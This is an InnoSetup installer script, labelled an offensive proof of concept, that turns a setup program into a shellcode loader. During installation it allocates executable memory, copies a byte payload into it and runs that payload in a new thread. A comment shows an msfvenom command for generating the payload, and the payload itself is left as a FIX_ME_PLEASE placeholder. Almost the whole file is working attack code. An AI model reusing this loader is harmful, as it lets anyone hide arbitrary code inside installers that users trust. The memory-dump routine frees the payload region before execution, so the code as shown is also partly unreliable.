; --------------------------------------------------------------------------------------
; PoC Author: Jean-Pierre LESUEUR (@DarkCoderSc)                                       -
; https://www.phrozen.io/                                                              -
; https://www.github.com/darkcodersc                                                   -
; jplesueur@phrozen.io                                                                 -
;                                                                                      -
; Category: Offsec PoC                                                                 -
; Description:                                                                         -
;  Embedd shellcode inside InnoSetup for execution during setup installation.          -
;  The shellcode is executed using InnoSetup Pascal Code Engine through Windows API.   -
;                                                                                      -
; REL: July 2021                                                                       -
; --------------------------------------------------------------------------------------

[Setup]
AppId={{D7EAA450-9906-4D8C-9E74-ED44DF692880}
AppName=InnoShellcode Example
AppVersion=1.5
AppPublisher=DarkCoderSc
AppPublisherURL=https://www.twitter.com/DarkCoderSc
AppSupportURL=https://www.twitter.com/DarkCoderSc
AppUpdatesURL=https://www.twitter.com/DarkCoderSc
CreateAppDir=no
PrivilegesRequired=lowest
OutputBaseFilename=innomal
Compression=lzma
SolidCompression=yes
WizardStyle=modern
Uninstallable=no

[Languages]
Name: "english"; MessagesFile: "compiler:Default.isl"

[Code]

type 
  TPayloadArray = array[0..FIX_ME_PLEASE-1] of byte;

procedure ExitProcess(uExitCode: Integer); external 'ExitProcess@kernel32.dll stdcall';

function VirtualAlloc(lpAddress : PAnsiChar; dwSize : Cardinal; flAllocationType, flProtect : DWORD) : Cardinal; external 'VirtualAlloc@kernel32.dll stdcall';
function VirtualFree(lpAddress : Cardinal; dwSize : Cardinal; dwFreeType : DWORD) : BOOL; external 'VirtualFree@kernel32.dll stdcall';
function GetLastError() : DWORD; external 'GetLastError@kernel32.dll stdcall';
function CreateThread(lpThreadAttributes : PAnsiChar; dwStackSize : Cardinal; lpStartAddress : Cardinal; lpParameter : PAnsiChar; dwCreationFlags : DWORD; var lpThreadId : DWORD) : THANDLE; external 'CreateThread@kernel32.dll stdcall';
procedure RtlMoveMemory(Dest: Cardinal; var Source: TPayloadArray; Len: Integer); external 'RtlMoveMemory@kernel32.dll stdcall';
procedure OutputDebugAddress(lpAddress : Cardinal); external 'OutputDebugStringA@kernel32.dll stdcall';
procedure OutputDebugStringA(lpOutputString : PAnsiChar); external 'OutputDebugStringA@kernel32.dll stdcall';
function CryptBinaryToStringA(lpAddress : Cardinal; cbBinary, dwFlags : DWORD; pszString : Cardinal; var pcchString : DWORD) : BOOL; external 'CryptBinaryToStringA@crypt32.dll stdcall';

const MEM_COMMIT             = $00001000;
      MEM_RESERVE            = $00002000;
      PAGE_EXECUTE_READWRITE = $00000040; 
      PAGE_READWRITE         = $00000004;    
      CRYPT_STRING_HEX       = $00000004;
      MEM_RELEASE            = $00008000;
      
var pNil    : PAnsiChar; // Trick to defined missing "nil/null" instruction on InnoSetup: InnoSetup initialize variable to NULL.
    PAYLOAD : TPayloadArray;

{ _.GetMem }

function GetMem(const ASize : Cardinal; const AExecute : Boolean) : Cardinal;
var AFlags : DWORD;
    ARet   : Cardinal;
begin
  if AExecute then
    AFlags := PAGE_EXECUTE_READWRITE
  else
    AFlags := PAGE_READWRITE;

  ARet := VirtualAlloc(pNil, ASize, MEM_COMMIT or MEM_RESERVE, AFlags);

  if GetLastError() = 0 then
    result := ARet
  else begin
    OutputDebugStringA(Format('Failed to create memory region with last error=[%d].', [GetLastError()])); 

    result := 0;
  end;
end;

{ _.FreeMem }

procedure FreeMem(const lpAddress : Cardinal; const ASize : DWORD);
begin
  VirtualFree(lpAddress, ASize, MEM_RELEASE);
end;

{ _.DumpMemory }

procedure DumpMemory(const lpAddress : Cardinal; const ASize : DWORD);
var AMemAddr : Cardinal;
    AReqSize : DWORD;
begin
  CryptBinaryToStringA(lpAddress, ASize, CRYPT_STRING_HEX, 0, AReqSize);

  AMemAddr := GetMem(AReqSize, False);
  try
    CryptBinaryToStringA(lpAddress, ASize, CRYPT_STRING_HEX, AMemAddr, AReqSize);

    OutputDebugAddress(AMemAddr);
  finally
    FreeMem(lpAddress, ASize);
  end;
end;

{ _.InitializePayload }

(* Example payload:
   msfvenom -p windows/exec -a x86 --platform Windows CMD=calc.exe EXITFUNC=thread -f python -v payload
*)
procedure InitializePayload();
begin
  FIX_ME_PLEASE
end;

{ _.CurStepChanged }

procedure CurStepChanged(CurStep: TSetupStep);
var AThreadId     : DWORD;    
    AThreadHandle : THandle;
    AMemAddr      : Cardinal;               
begin
  case CurStep of
      ssInstall : begin  
        OutputDebugStringA('Initialize Payload...');
        InitializePayload();

        ///
        OutputDebugStringA('Create new memory region to host our payload...');

        AMemAddr := GetMem(Length(PAYLOAD), True);       
        if (AMemAddr = 0) then                                                                           
          Exit;                         

        OutputDebugStringA(
          Format('Memory region successfully created at address=[%x(%d)], size=[%dB].', [
            AMemAddr,
            AMemAddr,
            Length(PAYLOAD)
          ])
         );        

        OutputDebugStringA('Copy our payload to new memory region...');
       
        RtlMoveMemory(AMemAddr, PAYLOAD, Length(PAYLOAD));  
        
        OutputDebugStringA('Payload successfully copied. Dumping memory region content:');
        DumpMemory(AMemAddr, Length(PAYLOAD));
        OutputDebugStringA('---');

        OutputDebugStringA('Execute payload in a separate thread...');
      
        AThreadHandle := CreateThread(pNil, 0, AMemAddr, pNil, 0, AThreadId);       
        if (AThreadHandle > 0) or (GetLastError <> 0) then
          OutputDebugStringA(Format('Payload successfully executed, ThreadHandle=[%d], ThreadId=[%d].', [AThreadHandle, AThreadId]))
        else
          OutputDebugStringA('Failed to execute payload.');     
      end;
  end;
end;
